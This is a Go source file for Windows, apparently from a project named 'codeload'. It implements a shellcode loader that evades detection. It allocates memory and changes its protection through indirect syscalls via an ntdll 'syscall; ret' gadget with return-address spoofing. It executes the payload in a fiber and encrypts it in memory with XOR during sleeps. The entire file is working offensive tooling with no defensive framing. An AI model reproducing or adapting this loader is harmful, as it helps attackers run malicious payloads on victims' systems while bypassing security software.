//go:build windows

package main

import (
	"codeload/internal/evasion"
	"codeload/internal/log"
	"crypto/rand"
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

// Windows API constants and structures for Fiber and execution
var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procConvertThreadToFiber = kernel32.NewProc("ConvertThreadToFiber")
	procCreateFiber          = kernel32.NewProc("CreateFiber")
	procSwitchToFiber        = kernel32.NewProc("SwitchToFiber")
	procCreateWaitableTimer  = kernel32.NewProc("CreateWaitableTimerW")
	procSetWaitableTimer     = kernel32.NewProc("SetWaitableTimer")
	procWaitForSingleObject  = kernel32.NewProc("WaitForSingleObject")
	procSleepEx              = kernel32.NewProc("SleepEx")
)

const (
	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	INFINITE          = 0xFFFFFFFF
)

// SyscallJump is defined in asm
func SyscallJump(ssn uint16, gadget uintptr, a1, a2, a3, a4, a5, a6, spoofAddr uintptr) uintptr

var cachedSpoofAddr uintptr

func getSpoofAddr() uintptr {
	if cachedSpoofAddr == 0 {
		cachedSpoofAddr = evasion.GetSpoofGadget()
	}
	return cachedSpoofAddr
}

// findSyscallGadget finds a 'syscall; ret' instruction sequence in ntdll.
func findSyscallGadget() uintptr {
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	handle := uintptr(ntdll)
	for i := 0; i < 0x200000; i++ {
		ptr := (*[3]byte)(unsafe.Pointer(handle + uintptr(i)))
		if ptr[0] == 0x0F && ptr[1] == 0x05 && ptr[2] == 0xC3 { // syscall; ret
			return handle + uintptr(i)
		}
	}
	return 0
}

// xorEncryptDecrypt is a simple XOR cipher for sleep masking.
func xorEncryptDecrypt(data []byte, key []byte) {
	keyLen := len(key)
	for i := 0; i < len(data); i++ {
		data[i] ^= key[i%keyLen]
	}
}

// smartSleep implements the enhanced sleep masking technique.
func smartSleep(duration time.Duration, shellcodeAddr uintptr, shellcodeSize int) error {
	log.Info("Smart Sleep for %v", duration)
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("failed to generate random key: %v", err)
	}

	shellcodeSlice := unsafe.Slice((*byte)(unsafe.Pointer(shellcodeAddr)), shellcodeSize)
	gadget := findSyscallGadget()
	sProtect := getSSN("NtProtectVirtualMemory")
	hProc := uintptr(0xffffffffffffffff)
	var oldProtectW, oldProtectX uint32

	// 1. Change memory to RW and encrypt
	status := SyscallJump(sProtect, gadget, hProc, uintptr(unsafe.Pointer(&shellcodeAddr)), uintptr(unsafe.Pointer(&shellcodeSize)), PAGE_READWRITE, uintptr(unsafe.Pointer(&oldProtectX)), 0, getSpoofAddr())
	if status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory (to RW) failed: 0x%x", status)
	}

	xorEncryptDecrypt(shellcodeSlice, key)

	// 2. Use a waitable timer for sleeping
	timerHandle, _, _ := procCreateWaitableTimer.Call(0, 0, 0)
	if timerHandle == 0 {
		return fmt.Errorf("CreateWaitableTimer failed")
	}
	defer syscall.CloseHandle(syscall.Handle(timerHandle))

	dueTime := -(duration.Nanoseconds() / 100)
	if ret, _, _ := procSetWaitableTimer.Call(timerHandle, uintptr(unsafe.Pointer(&dueTime)), 0, 0, 0, 0); ret == 0 {
		return fmt.Errorf("SetWaitableTimer failed")
	}

	procWaitForSingleObject.Call(timerHandle, INFINITE)

	// 3. Decrypt and change memory back to RX
	xorEncryptDecrypt(shellcodeSlice, key) // Decrypt

	status = SyscallJump(sProtect, gadget, hProc, uintptr(unsafe.Pointer(&shellcodeAddr)), uintptr(unsafe.Pointer(&shellcodeSize)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtectW)), 0, getSpoofAddr())
	if status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory (to RX) failed: 0x%x", status)
	}

	log.Success("Resumed from sleep")
	return nil
}

// executePayload orchestrates the allocation, writing, and execution of the shellcode.
// It uses a two-stage approach (RW -> RX) and Fiber for stable, stealthy execution.
func executePayload(shellcode []byte) {
	gadget := findSyscallGadget()
	if gadget == 0 {
		log.Error("Syscall gadget not found")
		return
	}

	// 1. Stage One: Allocate memory as RW
	var baseAddr uintptr = 0
	size := uintptr(len(shellcode))
	hProc := uintptr(0xffffffffffffffff) // Current process handle
	sAlloc := getSSN("NtAllocateVirtualMemory")

	status := SyscallJump(sAlloc, gadget, hProc, uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&size)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE, getSpoofAddr())
	if status != 0 {
		log.Error("Alloc failed: 0x%x", status)
		return
	}
	log.Success("Allocated RW at 0x%x", baseAddr)

	// 2. Stage Two: Write shellcode (Preserve MZ header for stability)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), size), shellcode)
	log.Info("Wrote shellcode")

	// 3. Stage Three: Change memory protection to RX
	sProtect := getSSN("NtProtectVirtualMemory")
	var oldProtect uint32
	status = SyscallJump(sProtect, gadget, hProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&size)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)), 0, getSpoofAddr())
	if status != 0 {
		log.Error("Protect RX failed: 0x%x", status)
		return
	}
	log.Success("Protection -> RX")

	// 4. Execution Stage: Launch via Fiber for independent stack management
	
	// Convert current thread to fiber
	mainFiber, _, _ := procConvertThreadToFiber.Call(0)
	if mainFiber == 0 {
		log.Error("ConvertThreadToFiber failed")
		return
	}

	// Create a new fiber pointing to our shellcode
	shellcodeFiber, _, _ := procCreateFiber.Call(0, baseAddr, 0)
	if shellcodeFiber == 0 {
		log.Error("CreateFiber failed")
		return
	}
	log.Info("Switching to fiber...")

	// Switch to the shellcode fiber to begin execution
	procSwitchToFiber.Call(shellcodeFiber)

	// The program will enter the fiber and typically not return here.
	// We keep the loop as a safety measure.
	for {
		procSleepEx.Call(INFINITE, 1)
	}
}
